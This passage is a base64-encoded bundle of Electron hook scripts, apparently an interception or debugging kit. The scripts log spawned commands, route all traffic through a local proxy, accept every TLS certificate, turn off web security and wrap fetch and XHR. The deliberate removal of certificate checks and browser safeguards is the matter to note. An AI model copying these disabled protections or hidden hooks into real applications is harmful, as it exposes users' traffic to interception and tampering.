CAKICAgICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgLy8gU2lsZW50IGZhaWx1cmUgLSBkb24ndCBjcmFzaCBpZiBsb2dnaW5nIGZhaWxzCiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbUFJPQ0VTUy1MT0ddIEVycm9yOicsIGUubWVzc2FnZSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgLy8gU2FmZSBzZXJpYWxpemF0aW9uIGZvciBlbnZpcm9ubWVudCB2YXJpYWJsZXMKICAgICAgICBmdW5jdGlvbiBzYWZlU2VyaWFsaXplRW52KGVudikgewogICAgICAgICAgICBpZiAoIWVudikgcmV0dXJuIHt9OwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gRmlsdGVyIG91dCBwb3RlbnRpYWxseSBsYXJnZS9zZW5zaXRpdmUgZW52IHZhcnMKICAgICAgICAgICAgY29uc3QgZmlsdGVyZWQgPSB7fTsKICAgICAgICAgICAgY29uc3QgYWxsb3dlZFByZWZpeGVzID0gWydOT0RFXycsICdFTEVDVFJPTl8nLCAnbnBtXycsICdQQVRIJywgJ1VTRVInLCAnSE9NRSddOwogICAgICAgICAgICAKICAgICAgICAgICAgT2JqZWN0LmtleXMoZW52KS5mb3JFYWNoKGtleSA9PiB7CiAgICAgICAgICAgICAgICBpZiAoYWxsb3dlZFByZWZpeGVzLnNvbWUocHJlZml4ID0+IGtleS5zdGFydHNXaXRoKHByZWZpeCkpKSB7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgdmFsdWUgPSBlbnZba2V5XTsKICAgICAgICAgICAgICAgICAgICBmaWx0ZXJlZFtrZXldID0gdHlwZW9mIHZhbHVlID09PSAnc3RyaW5nJyAmJiB2YWx1ZS5sZW5ndGggPiAxMDAgCiAgICAgICAgICAgICAgICAgICAgICAgID8gdmFsdWUuc3Vic3RyaW5nKDAsIDEwMCkgKyAnLi4uJyAKICAgICAgICAgICAgICAgICAgICAgICAgOiB2YWx1ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICByZXR1cm4gZmlsdGVyZWQ7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIC8vIFNhZmUgc2VyaWFsaXphdGlvbiBmb3IgYXJndW1lbnRzCiAgICAgICAgZnVuY3Rpb24gc2FmZVNlcmlhbGl6ZUFyZ3MoYXJncykgewogICAgICAgICAgICBpZiAoIWFyZ3MpIHJldHVybiBbXTsKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybiBhcmdzLm1hcChhcmcgPT4gewogICAgICAgICAgICAgICAgaWYgKHR5cGVvZiBhcmcgPT09ICdzdHJpbmcnKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGFyZy5sZW5ndGggPiAyMDAgPyBhcmcuc3Vic3RyaW5nKDAsIDIwMCkgKyAnLi4uJyA6IGFyZzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHJldHVybiBTdHJpbmcoYXJnKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIC8vIExvZyBzZXNzaW9uIHN0YXJ0CiAgICAgICAgbG9nKHsKICAgICAgICAgICAgdHlwZTogJ3Nlc3Npb25fc3RhcnQnLAogICAgICAgICAgICBwaWQ6IHByb2Nlc3MucGlkLAogICAgICAgICAgICBwcGlkOiBwcm9jZXNzLnBwaWQKICAgICAgICB9KTsKICAgICAgICAKICAgICAgICAvLyBIb29rIHByb2Nlc3MgY3JlYXRpb24KICAgICAgICBjb25zdCBvcmlnaW5hbFNwYXduID0gY2hpbGRQcm9jZXNzLnNwYXduOwogICAgICAgIGNoaWxkUHJvY2Vzcy5zcGF3biA9IGZ1bmN0aW9uKGNvbW1hbmQsIGFyZ3MsIG9wdGlvbnMpIHsKICAgICAgICAgICAgbG9nKHsKICAgICAgICAgICAgICAgIHR5cGU6ICdzcGF3bicsCiAgICAgICAgICAgICAgICBjb21tYW5kLAogICAgICAgICAgICAgICAgYXJnczogc2FmZVNlcmlhbGl6ZUFyZ3MoYXJncyksCiAgICAgICAgICAgICAgICBvcHRpb25zOiB7CiAgICAgICAgICAgICAgICAgICAgY3dkOiBvcHRpb25zPy5jd2QsCiAgICAgICAgICAgICAgICAgICAgc2hlbGw6IG9wdGlvbnM/LnNoZWxsLAogICAgICAgICAgICAgICAgICAgIGVudjogb3B0aW9ucz8uZW52ID8gJ1tFbnZpcm9ubWVudCBWYXJpYWJsZXMgUHJlc2VudF0nIDogdW5kZWZpbmVkCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICAKICAgICAgICAgICAgY29uc3QgcHJvYyA9IG9yaWdpbmFsU3Bhd24uY2FsbCh0aGlzLCBjb21tYW5kLCBhcmdzLCBvcHRpb25zKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIHByb2Mub24oJ2Vycm9yJywgKGVycikgPT4gewogICAgICAgICAgICAgICAgbG9nKHsKICAgICAgICAgICAgICAgICAgICB0eXBlOiAnc3Bhd25fZXJyb3InLAogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQsCiAgICAgICAgICAgICAgICAgICAgZXJyb3I6IGVyci5tZXNzYWdlCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIAogICAgICAgICAgICBwcm9jLm9uKCdleGl0JywgKGNvZGUsIHNpZ25hbCkgPT4gewogICAgICAgICAgICAgICAgbG9nKHsKICAgICAgICAgICAgICAgICAgICB0eXBlOiAnc3Bhd25fZXhpdCcsCiAgICAgICAgICAgICAgICAgICAgY29tbWFuZCwKICAgICAgICAgICAgICAgICAgICBjb2RlLAogICAgICAgICAgICAgICAgICAgIHNpZ25hbAogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICAKICAgICAgICAgICAgcmV0dXJuIHByb2M7CiAgICAgICAgfTsKICAgICAgICAKICAgICAgICBjb25zdCBvcmlnaW5hbEV4ZWMgPSBjaGlsZFByb2Nlc3MuZXhlYzsKICAgICAgICBjaGlsZFByb2Nlc3MuZXhlYyA9IGZ1bmN0aW9uKGNvbW1hbmQsIG9wdGlvbnMsIGNhbGxiYWNrKSB7CiAgICAgICAgICAgIGxvZyh7CiAgICAgICAgICAgICAgICB0eXBlOiAnZXhlYycsCiAgICAgICAgICAgICAgICBjb21tYW5kOiB0eXBlb2YgY29tbWFuZCA9PT0gJ3N0cmluZycgJiYgY29tbWFuZC5sZW5ndGggPiAyMDAgCiAgICAgICAgICAgICAgICAgICAgPyBjb21tYW5kLnN1YnN0cmluZygwLCAyMDApICsgJy4uLicgCiAgICAgICAgICAgICAgICAgICAgOiBjb21tYW5kLAogICAgICAgICAgICAgICAgb3B0aW9uczogewogICAgICAgICAgICAgICAgICAgIGN3ZDogb3B0aW9ucz8uY3dkLAogICAgICAgICAgICAgICAgICAgIHNoZWxsOiBvcHRpb25zPy5zaGVsbCwKICAgICAgICAgICAgICAgICAgICBlbnY6IG9wdGlvbnM/LmVudiA/ICdbRW52aXJvbm1lbnQgVmFyaWFibGVzIFByZXNlbnRdJyA6IHVuZGVmaW5lZAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKICAgICAgICAgICAgcmV0dXJuIG9yaWdpbmFsRXhlYy5jYWxsKHRoaXMsIGNvbW1hbmQsIG9wdGlvbnMsIGNhbGxiYWNrKTsKICAgICAgICB9OwogICAgICAgIAogICAgICAgIGNvbnN0IG9yaWdpbmFsRXhlY0ZpbGUgPSBjaGlsZFByb2Nlc3MuZXhlY0ZpbGU7CiAgICAgICAgY2hpbGRQcm9jZXNzLmV4ZWNGaWxlID0gZnVuY3Rpb24oZmlsZSwgYXJncywgb3B0aW9ucywgY2FsbGJhY2spIHsKICAgICAgICAgICAgbG9nKHsKICAgICAgICAgICAgICAgIHR5cGU6ICdleGVjX2ZpbGUnLAogICAgICAgICAgICAgICAgZmlsZSwKICAgICAgICAgICAgICAgIGFyZ3M6IHNhZmVTZXJpYWxpemVBcmdzKGFyZ3MpLAogICAgICAgICAgICAgICAgb3B0aW9uczogewogICAgICAgICAgICAgICAgICAgIGN3ZDogb3B0aW9ucz8uY3dkLAogICAgICAgICAgICAgICAgICAgIHNoZWxsOiBvcHRpb25zPy5zaGVsbCwKICAgICAgICAgICAgICAgICAgICBlbnY6IG9wdGlvbnM/LmVudiA/ICdbRW52aXJvbm1lbnQgVmFyaWFibGVzIFByZXNlbnRdJyA6IHVuZGVmaW5lZAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKICAgICAgICAgICAgcmV0dXJuIG9yaWdpbmFsRXhlY0ZpbGUuY2FsbCh0aGlzLCBmaWxlLCBhcmdzLCBvcHRpb25zLCBjYWxsYmFjayk7CiAgICAgICAgfTsKICAgICAgICAKICAgICAgICAvLyBXYWl0IGZvciBhcHAgdG8gYmUgcmVhZHkgYmVmb3JlIGFkZGluZyBldmVudCBsaXN0ZW5lcnMKICAgICAgICBjb25zdCBzZXR1cEFwcExpc3RlbmVycyA9ICgpID0+IHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGFwcC5vbignY2hpbGQtcHJvY2Vzcy1nb25lJywgKGV2ZW50LCBkZXRhaWxzKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgbG9nKHsKICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogJ2NoaWxkX3Byb2Nlc3NfZ29uZScsCiAgICAgICAgICAgICAgICAgICAgICAgIGRldGFpbHM6IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6IGRldGFpbHMudHlwZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlYXNvbjogZGV0YWlscy5yZWFzb24sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0Q29kZTogZGV0YWlscy5leGl0Q29kZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgYXBwLm9uKCdyZW5kZXItcHJvY2Vzcy1nb25lJywgKGV2ZW50LCB3ZWJDb250ZW50cywgZGV0YWlscykgPT4gewogICAgICAgICAgICAgICAgICAgIGxvZyh7CiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdyZW5kZXJfcHJvY2Vzc19nb25lJywKICAgICAgICAgICAgICAgICAgICAgICAgd2ViQ29udGVudHNJZDogd2ViQ29udGVudHMuaWQsCiAgICAgICAgICAgICAgICAgICAgICAgIGRldGFpbHM6IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlYXNvbjogZGV0YWlscy5yZWFzb24sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0Q29kZTogZGV0YWlscy5leGl0Q29kZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgYXBwLm9uKCdncHUtcHJvY2Vzcy1jcmFzaGVkJywgKGV2ZW50LCBraWxsZWQpID0+IHsKICAgICAgICAgICAgICAgICAgICBsb2coewogICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAnZ3B1X3Byb2Nlc3NfY3Jhc2hlZCcsCiAgICAgICAgICAgICAgICAgICAgICAgIGtpbGxlZAogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgIGxvZyh7CiAgICAgICAgICAgICAgICAgICAgdHlwZTogJ2FwcF9saXN0ZW5lcl9lcnJvcicsCiAgICAgICAgICAgICAgICAgICAgZXJyb3I6IGUubWVzc2FnZQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0KICAgICAgICB9OwogICAgICAgIAogICAgICAgIC8vIFNldHVwIGFwcCBsaXN0ZW5lcnMgd2hlbiBhcHAgaXMgcmVhZHkKICAgICAgICBpZiAoYXBwLmlzUmVhZHkoKSkgewogICAgICAgICAgICBzZXR1cEFwcExpc3RlbmVycygpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGFwcC53aGVuUmVhZHkoKS50aGVuKHNldHVwQXBwTGlzdGVuZXJzKTsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgLy8gTW9uaXRvciBwcm9jZXNzIGV2ZW50cwogICAgICAgIHByb2Nlc3Mub24oJ3VuY2F1Z2h0RXhjZXB0aW9uJywgKGVycm9yKSA9PiB7CiAgICAgICAgICAgIGxvZyh7CiAgICAgICAgICAgICAgICB0eXBlOiAndW5jYXVnaHRfZXhjZXB0aW9uJywKICAgICAgICAgICAgICAgIGVycm9yOiBlcnJvci5tZXNzYWdlLAogICAgICAgICAgICAgICAgc3RhY2s6IGVycm9yLnN0YWNrCiAgICAgICAgICAgIH0pOwogICAgICAgIH0pOwogICAgICAgIAogICAgICAgIHByb2Nlc3Mub24oJ3VuaGFuZGxlZFJlamVjdGlvbicsIChyZWFzb24sIHByb21pc2UpID0+IHsKICAgICAgICAgICAgbG9nKHsKICAgICAgICAgICAgICAgIHR5cGU6ICd1bmhhbmRsZWRfcmVqZWN0aW9uJywKICAgICAgICAgICAgICAgIHJlYXNvbjogcmVhc29uPy5tZXNzYWdlIHx8IFN0cmluZyhyZWFzb24pLAogICAgICAgICAgICAgICAgc3RhY2s6IHJlYXNvbj8uc3RhY2sKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICAgICAgCiAgICAgICAgLy8gTG9nIGluaXRpYWwgcHJvY2VzcyBpbmZvICh3aXRoIHNhZmUgZW52IHNlcmlhbGl6YXRpb24pCiAgICAgICAgbG9nKHsKICAgICAgICAgICAgdHlwZTogJ3Byb2Nlc3NfaW5mbycsCiAgICAgICAgICAgIHBpZDogcHJvY2Vzcy5waWQsCiAgICAgICAgICAgIHBwaWQ6IHByb2Nlc3MucHBpZCwKICAgICAgICAgICAgcGxhdGZvcm06IHByb2Nlc3MucGxhdGZvcm0sCiAgICAgICAgICAgIGFyY2g6IHByb2Nlc3MuYXJjaCwKICAgICAgICAgICAgdmVyc2lvbjogcHJvY2Vzcy52ZXJzaW9uLAogICAgICAgICAgICBjd2Q6IHByb2Nlc3MuY3dkKCksCiAgICAgICAgICAgIGVudjogc2FmZVNlcmlhbGl6ZUVudihwcm9jZXNzLmVudikKICAgICAgICB9KTsKICAgICAgICAKICAgICAgICBsb2coewogICAgICAgICAgICB0eXBlOiAnaG9va19pbnN0YWxsZWQnLAogICAgICAgICAgICBtZXNzYWdlOiAnUHJvY2VzcyBob29rcyBpbnN0YWxsZWQgc3VjY2Vzc2Z1bGx5JywKICAgICAgICAgICAgbG9nUGF0aDogcGF0aC5qb2luKG9zLmhvbWVkaXIoKSwgJy5sb2NhbCcsICdoYWRyb24nLCAnbG9ncycsICdwcm9jZXNzLmpzb24nKQogICAgICAgIH0pOwogICAgICAgIAogICAgICAgIGNvbnNvbGUubG9nKCdbUFJPQ0VTU10gSG9vayBpbnN0YWxsZWQgc3VjY2Vzc2Z1bGx5Jyk7CiAgICAgICAgY29uc29sZS5sb2coJ1tQUk9DRVNTXSBMb2dnaW5nIHRvOicsIHBhdGguam9pbihvcy5ob21lZGlyKCksICcubG9jYWwnLCAnaGFkcm9uJywgJ2xvZ3MnLCAncHJvY2Vzcy5qc29uJykpOwogICAgICAgIAogICAgfSBjYXRjaChlcnIpIHsKICAgICAgICBjb25zb2xlLmVycm9yKCdbUFJPQ0VTU10gU2V0dXAgZXJyb3I6JywgZXJyLm1lc3NhZ2UpOwogICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tQUk9DRVNTXSBTdGFjazonLCBlcnIuc3RhY2spOwogICAgfQp9KSgpOw==","proxy-main.js":"Ly8gTWFpbiBwcm9jZXNzIGhvb2sgdG8gaW5qZWN0IHByZWxvYWQgc2NyaXB0CihmdW5jdGlvbigpIHsKICAgIHRyeSB7CiAgICAgICAgY29uc3QgeyBhcHAsIEJyb3dzZXJXaW5kb3csIHNlc3Npb24gfSA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7CiAgICAgICAgY29uc3QgcGF0aCA9IHJlcXVpcmUoJ3BhdGgnKTsKICAgICAgICBjb25zdCBmcyA9IHJlcXVpcmUoJ2ZzJyk7CgogICAgICAgIC8vIERpc2FibGUgU1NMIHZlcmlmaWNhdGlvbiBmb3IgYWxsIHNlc3Npb25zCiAgICAgICAgYXBwLm9uKCdyZWFkeScsICgpID0+IHsKICAgICAgICAgICAgLy8gRGlzYWJsZSBjZXJ0aWZpY2F0ZSB2ZXJpZmljYXRpb24gZm9yIGFsbCBzZXNzaW9ucwogICAgICAgICAgICBzZXNzaW9uLmRlZmF1bHRTZXNzaW9uLnNldENlcnRpZmljYXRlVmVyaWZ5UHJvYygocmVxdWVzdCwgY2FsbGJhY2spID0+IHsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbUFJPWFldIENlcnRpZmljYXRlIHZlcmlmaWNhdGlvbjonLCByZXF1ZXN0Lmhvc3RuYW1lKTsKICAgICAgICAgICAgICAgIC8vIEFsd2F5cyBhY2NlcHQgdGhlIGNlcnRpZmljYXRlCiAgICAgICAgICAgICAgICBjYWxsYmFjaygwKTsKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAvLyBTZXQgdXAgZ2xvYmFsIHByb3h5IHNldHRpbmdzCiAgICAgICAgICAgIHNlc3Npb24uZGVmYXVsdFNlc3Npb24uc2V0UHJveHkoewogICAgICAgICAgICAgICAgbW9kZTogJ2ZpeGVkX3NlcnZlcnMnLAogICAgICAgICAgICAgICAgcHJveHlSdWxlczogJ2h0dHA9bG9jYWxob3N0OjgwODE7aHR0cHM9bG9jYWxob3N0OjgwODEnCiAgICAgICAgICAgIH0sICgpID0+IHsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbUFJPWFldIEdsb2JhbCBwcm94eSBzZXR0aW5ncyBhcHBsaWVkJyk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0pOwoKICAgICAgICAvLyBTdG9yZSBvcmlnaW5hbCBtZXRob2RzCiAgICAgICAgY29uc3Qgb3JpZ2luYWxMb2FkVVJMID0gQnJvd3NlcldpbmRvdy5wcm90b3R5cGUubG9hZFVSTDsKICAgICAgICBjb25zdCBvcmlnaW5hbExvYWRGaWxlID0gQnJvd3NlcldpbmRvdy5wcm90b3R5cGUubG9hZEZpbGU7CgogICAgICAgIC8vIEhvb2sgbG9hZFVSTCB0byBpbmplY3Qgb3VyIHByZWxvYWQKICAgICAgICBCcm93c2VyV2luZG93LnByb3RvdHlwZS5sb2FkVVJMID0gZnVuY3Rpb24odXJsLCBvcHRpb25zID0ge30pIHsKICAgICAgICAgICAgY29uc29sZS5sb2coJ1tQUk9YWV0gTG9hZGluZyBVUkw6JywgdXJsKTsKICAgICAgICAgICAgaWYgKCFvcHRpb25zLndlYlByZWZlcmVuY2VzKSB7CiAgICAgICAgICAgICAgICBvcHRpb25zLndlYlByZWZlcmVuY2VzID0ge307CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCFvcHRpb25zLndlYlByZWZlcmVuY2VzLnByZWxvYWQpIHsKICAgICAgICAgICAgICAgIG9wdGlvbnMud2ViUHJlZmVyZW5jZXMucHJlbG9hZCA9IHBhdGguam9pbihfX2Rpcm5hbWUsICdwcm94eS1wcmVsb2FkLmpzJyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLy8gRGlzYWJsZSB3ZWIgc2VjdXJpdHkgdG8gYWxsb3cgcHJveHlpbmcKICAgICAgICAgICAgb3B0aW9ucy53ZWJQcmVmZXJlbmNlcy53ZWJTZWN1cml0eSA9IGZhbHNlOwogICAgICAgICAgICBvcHRpb25zLndlYlByZWZlcmVuY2VzLmFsbG93UnVubmluZ0luc2VjdXJlQ29udGVudCA9IHRydWU7CiAgICAgICAgICAgIHJldHVybiBvcmlnaW5hbExvYWRVUkwuY2FsbCh0aGlzLCB1cmwsIG9wdGlvbnMpOwogICAgICAgIH07CgogICAgICAgIC8vIEhvb2sgbG9hZEZpbGUgc2ltaWxhcmx5CiAgICAgICAgQnJvd3NlcldpbmRvdy5wcm90b3R5cGUubG9hZEZpbGUgPSBmdW5jdGlvbihmaWxlUGF0aCwgb3B0aW9ucyA9IHt9KSB7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbUFJPWFldIExvYWRpbmcgZmlsZTonLCBmaWxlUGF0aCk7CiAgICAgICAgICAgIGlmICghb3B0aW9ucy53ZWJQcmVmZXJlbmNlcykgewogICAgICAgICAgICAgICAgb3B0aW9ucy53ZWJQcmVmZXJlbmNlcyA9IHt9OwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICghb3B0aW9ucy53ZWJQcmVmZXJlbmNlcy5wcmVsb2FkKSB7CiAgICAgICAgICAgICAgICBvcHRpb25zLndlYlByZWZlcmVuY2VzLnByZWxvYWQgPSBwYXRoLmpvaW4oX19kaXJuYW1lLCAncHJveHktcHJlbG9hZC5qcycpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vIERpc2FibGUgd2ViIHNlY3VyaXR5IHRvIGFsbG93IHByb3h5aW5nCiAgICAgICAgICAgIG9wdGlvbnMud2ViUHJlZmVyZW5jZXMud2ViU2VjdXJpdHkgPSBmYWxzZTsKICAgICAgICAgICAgb3B0aW9ucy53ZWJQcmVmZXJlbmNlcy5hbGxvd1J1bm5pbmdJbnNlY3VyZUNvbnRlbnQgPSB0cnVlOwogICAgICAgICAgICByZXR1cm4gb3JpZ2luYWxMb2FkRmlsZS5jYWxsKHRoaXMsIGZpbGVQYXRoLCBvcHRpb25zKTsKICAgICAgICB9OwoKICAgICAgICAvLyBIb29rIHdpbmRvdyBjcmVhdGlvbgogICAgICAgIGNvbnN0IG9yaWdpbmFsQ3JlYXRlV2luZG93ID0gQnJvd3NlcldpbmRvdy5wcm90b3R5cGUuY29uc3RydWN0b3I7CiAgICAgICAgQnJvd3NlcldpbmRvdy5wcm90b3R5cGUuY29uc3RydWN0b3IgPSBmdW5jdGlvbihvcHRpb25zID0ge30pIHsKICAgICAgICAgICAgY29uc29sZS5sb2coJ1tQUk9YWV0gQ3JlYXRpbmcgbmV3IHdpbmRvdycpOwogICAgICAgICAgICBpZiAoIW9wdGlvbnMud2ViUHJlZmVyZW5jZXMpIHsKICAgICAgICAgICAgICAgIG9wdGlvbnMud2ViUHJlZmVyZW5jZXMgPSB7fTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoIW9wdGlvbnMud2ViUHJlZmVyZW5jZXMucHJlbG9hZCkgewogICAgICAgICAgICAgICAgb3B0aW9ucy53ZWJQcmVmZXJlbmNlcy5wcmVsb2FkID0gcGF0aC5qb2luKF9fZGlybmFtZSwgJ3Byb3h5LXByZWxvYWQuanMnKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAvLyBEaXNhYmxlIHdlYiBzZWN1cml0eSB0byBhbGxvdyBwcm94eWluZwogICAgICAgICAgICBvcHRpb25zLndlYlByZWZlcmVuY2VzLndlYlNlY3VyaXR5ID0gZmFsc2U7CiAgICAgICAgICAgIG9wdGlvbnMud2ViUHJlZmVyZW5jZXMuYWxsb3dSdW5uaW5nSW5zZWN1cmVDb250ZW50ID0gdHJ1ZTsKICAgICAgICAgICAgcmV0dXJuIG5ldyBvcmlnaW5hbENyZWF0ZVdpbmRvdyhvcHRpb25zKTsKICAgICAgICB9OwoKICAgICAgICAvLyBBbHNvIGhvb2sgdGhlIGFwcCdzIHJlYWR5IGV2ZW50IHRvIGVuc3VyZSBvdXIgcHJlbG9hZCBpcyBzZXQKICAgICAgICBhcHAub24oJ3JlYWR5JywgKCkgPT4gewogICAgICAgICAgICAvLyBTZXQgdXAgZ2xvYmFsIHByb3h5IHNldHRpbmdzIGZvciBhbGwgbmV3IHdpbmRvd3MKICAgICAgICAgICAgc2Vzc2lvbi5kZWZhdWx0U2Vzc2lvbi5zZXRQcm94eSh7CiAgICAgICAgICAgICAgICBtb2RlOiAnZml4ZWRfc2VydmVycycsCiAgICAgICAgICAgICAgICBwcm94eVJ1bGVzOiAnaHR0cD1sb2NhbGhvc3Q6ODA4MTtodHRwcz1sb2NhbGhvc3Q6ODA4MScKICAgICAgICAgICAgfSwgKCkgPT4gewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ1tQUk9YWV0gR2xvYmFsIHByb3h5IHNldHRpbmdzIGFwcGxpZWQnKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CgogICAgICAgIGNvbnNvbGUubG9nKCdbUFJPWFldIE1haW4gcHJvY2VzcyBob29rcyBpbnN0YWxsZWQnKTsKICAgIH0gY2F0Y2goZXJyKSB7CiAgICAgICAgY29uc29sZS5lcnJvcignW1BST1hZXSBNYWluIHByb2Nlc3MgZXJyb3I6JywgZXJyLm1lc3NhZ2UpOwogICAgfQp9KSgpOyA=","proxy-preload.js":"Ly8gUHJlbG9hZCBzY3JpcHQgdG8gaW5qZWN0IHByb3h5IGhvb2tzIGludG8gcmVuZGVyZXIKKGZ1bmN0aW9uKCkgewogICAgdHJ5IHsKICAgICAgICBjb25zdCB7IGNvbnRleHRCcmlkZ2UsIGlwY1JlbmRlcmVyIH0gPSByZXF1aXJlKCdlbGVjdHJvbicpOwogICAgICAgIAogICAgICAgIC8vIEluamVjdCBvdXIgcHJveHkgY29kZSBpbnRvIHRoZSByZW5kZXJlcgogICAgICAgIGNvbnRleHRCcmlkZ2UuZXhwb3NlSW5NYWluV29ybGQoJ19fUFJPWFlfSE9PS19fJywgewogICAgICAgICAgICBpbnN0YWxsOiAoKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygnW1BST1hZXSBJbnN0YWxsaW5nIHJlbmRlcmVyIGhvb2tzJyk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIEhvb2sgZmV0Y2gKICAgICAgICAgICAgICAgIGNvbnN0IG9yaWdpbmFsRmV0Y2ggPSB3aW5kb3cuZmV0Y2g7CiAgICAgICAgICAgICAgICB3aW5kb3cuZmV0Y2ggPSBhc3luYyBmdW5jdGlvbihpbnB1dCwgaW5pdCkgewogICAgICAgICAgICAgICAgICAgIGNvbnN0IHVybCA9IGlucHV0IGluc3RhbmNlb2YgUmVxdWVzdCA/IGlucHV0LnVybCA6IGlucHV0OwogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGBbUFJPWFldIEludGVyY2VwdGVkIGZldGNoOiAke3VybH1gKTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiAodXJsLmluY2x1ZGVzKCdsb2NhbGhvc3QnKSB8fCB1cmwuaW5jbHVkZXMoJzEyNy4wLjAuMScpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbUFJPWFldIFNraXBwaW5nIGxvY2FsaG9zdCBmZXRjaCcpOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gb3JpZ2luYWxGZXRjaC5jYWxsKHRoaXMsIGlucHV0LCBpbml0KTsKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbUFJPWFldIFByb3h5aW5nIGZldGNoIHJlcXVlc3QnKTsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBvcmlnaW5hbEZldGNoLmNhbGwodGhpcywgaW5wdXQsIGluaXQpOwogICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygnW1BST1hZXSBGZXRjaCByZXNwb25zZTonLCByZXNwb25zZS5zdGF0dXMpOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVzcG9uc2U7CiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcihgW1BST1hZXSBGZXRjaCBlcnJvcjogJHtlcnJvci5tZXNzYWdlfWApOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gb3JpZ2luYWxGZXRjaC5jYWxsKHRoaXMsIGlucHV0LCBpbml0KTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9OwoKICAgICAgICAgICAgICAgIC8vIEhvb2sgWE1MSHR0cFJlcXVlc3QKICAgICAgICAgICAgICAgIGNvbnN0IG9yaWdpbmFsWEhST3BlbiA9IFhNTEh0dHBSZXF1ZXN0LnByb3RvdHlwZS5vcGVuOwogICAgICAgICAgICAgICAgY29uc3Qgb3JpZ2luYWxYSFJTZW5kID0gWE1MSHR0cFJlcXVlc3QucHJvdG90eXBlLnNlbmQ7CgogICAgICAgICAgICAgICAgWE1MSHR0cFJlcXVlc3QucHJvdG90eXBlLm9wZW4gPSBmdW5jdGlvbihtZXRob2QsIHVybCwgLi4uYXJncykgewogICAgICAgICAgICAgICAgICAgIHRoaXMuX29yaWdpbmFsVXJsID0gdXJsOwogICAgICAgICAgICAgICAgICAgIHRoaXMuX29yaWdpbmFsTWV0aG9kID0gbWV0aG9kOwogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGBbUFJPWFldIEludGVyY2VwdGVkIFhIUjogJHt0aGlzLl9vcmlnaW5hbFVybH1gKTsKICAgICAgICAgICAgICAgICAgI